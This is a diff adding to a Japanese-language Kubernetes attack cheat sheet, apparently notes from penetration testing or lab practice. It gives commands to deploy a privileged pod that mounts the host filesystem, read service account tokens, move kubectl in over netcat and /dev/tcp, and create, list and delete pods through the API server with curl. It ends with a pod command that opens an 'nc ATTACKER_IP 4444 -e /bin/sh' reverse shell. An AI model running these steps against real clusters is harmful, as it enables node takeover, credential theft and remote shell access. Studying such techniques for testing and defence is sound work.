@@ -67,10 +67,118 @@ spec:
       path: /
 ```
 
+ホストの / を ゲストの /host にマウントしていることに注意
+
+デプロイ
+
 ```sh
 kubectl apply -f privesc.yml --token=${TOKEN}
+```
 
+実行
+
+```sh
+# インタラクティブ
 kubectl exec -it everything-allowed-exec-pod --token=${TOKEN} -- /bin/bash
+
+# TTYが無い場合（Webシェルなど）
+kubectl exec everything-allowed-exec-pod --token=${TOKEN} -- ls -al /host/root
+```
+
+## トークン
+
+```sh
+cat /var/run/secrets/kubernetes.io/serviceaccount/token
+
+TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+```
+
+PodでK8S環境を確認
+
+```sh
+# env | grep KUBERNETES
+KUBERNETES_SERVICE_PORT=443
+KUBERNETES_PORT=tcp://10.152.183.1:443
+KUBERNETES_PORT_443_TCP_ADDR=10.152.183.1
+KUBERNETES_PORT_443_TCP_PORT=443
+KUBERNETES_PORT_443_TCP_PROTO=tcp
+KUBERNETES_SERVICE_PORT_HTTPS=443
+KUBERNETES_PORT_443_TCP=tcp://10.152.183.1:443
+KUBERNETES_SERVICE_HOST=10.152.183.1
+```
+
+## バイナリ
+
+[最新バイナリダウンロード](https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/?source=post_page-----9dbd2cada99f---------------------------------------#install-kubectl-binary-with-curl-on-linux)
+
+```sh
+curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
+```
+
+```sh
+nc -lvnp 4444 < kubectl
+
+bash -c 'cat < /dev/tcp/192.168.138.236/4444 > kubectl'
+```
+
+## REST API
+
+```sh
+API="https://192.168.138.236:6443"
+TOKEN="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9..."
+```
+
+```sh
+curl -k \
+  -H "Authorization: Bearer $TOKEN" \
+  $API/version
+```
+
+```sh
+curl -k \
+  -H "Authorization: Bearer $TOKEN" \
+  $API/api/v1/namespaces
+```
+
+```sh
+curl -k \
+  -H "Authorization: Bearer $TOKEN" \
+  $API/api/v1/namespaces/default/pods
+```
+
+```sh
+curl -k \
+  -H "Authorization: Bearer $TOKEN" \
+  $API/api/v1/namespaces/default/pods/everything-allowed-exec-pod
+```
+
+```sh
+curl -k \
+  -H "Authorization: Bearer $TOKEN" \
+  "$API/api/v1/namespaces/default/pods/everything-allowed-exec-pod/log"
+```
+
+```sh
+# pod.json は YAML ではなく JSON にするのが確実
+curl -k \
+  -X POST \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  --data-binary @pod.json \
+  $API/api/v1/namespaces/default/pods
+```
+
+```sh
+curl -k \
+  -X DELETE \
+  -H "Authorization: Bearer $TOKEN" \
+  $API/api/v1/namespaces/default/pods/everything-allowed-exec-pod
+```
+
+curl による REST API の直叩きではExecを実行できないが、コマンドを実行したい場合、kubectlをコピーしたり、Podの定義で実行するコマンドを指定したりできる。
+
+```
+"command": ["/bin/sh", "-c", "nc ATTACKER_IP 4444 -e /bin/sh"]
 ```
 
 ## microk8s
